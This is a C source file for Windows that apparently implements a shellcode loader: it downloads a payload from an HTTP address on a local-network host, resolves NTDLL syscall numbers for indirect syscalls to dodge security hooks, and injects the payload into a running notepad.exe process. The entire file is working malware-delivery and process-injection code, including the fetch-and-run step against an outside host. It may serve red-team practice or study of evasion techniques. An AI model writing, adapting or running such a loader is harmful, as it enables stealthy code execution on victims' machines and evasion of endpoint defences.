#include <windows.h>
#include <stdio.h>

#include "Common.h"

#define PAYLOAD L"http://192.168.0.13:8000/calc.bin"
#define PROC L"notepad.exe"

int main() {

    PBYTE pBytes = 0;
    SIZE_T sBytesSize = 0;
    DWORD PID = 0;
    HANDLE hProcess = NULL;
    HMODULE hNTDLL = NULL;

    info("getting payload from url...")
    if (!GetPayloadFromUrl(PAYLOAD, &pBytes, &sBytesSize)) {
        return -1;
    }


    hNTDLL = GetMod(L"NTDLL.DLL");
    indirectMyAss("NtAllocateVirtualMemory", hNTDLL, &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
    indirectMyAss("NtCreateThreadEx", hNTDLL, &NtCreateThreadSSN, &NtCreateThreadSyscall);
    indirectMyAss("NtWriteVirtualMemory", hNTDLL, &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
    indirectMyAss("NtWaitForSingleObject", hNTDLL, &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);
    indirectMyAss("NtClose", hNTDLL, &NtCloseSSN, &NtCloseSyscall);

    info("running GetRemoteProcessHandle...\n\n");
    if (!GetRemoteProcessHandle(PROC, &PID, &hProcess)) {
        return -1;
    }



    if (!injectMyAss(hProcess, PID, pBytes, sBytesSize)) {
        return -1;
    }


    return 0;
}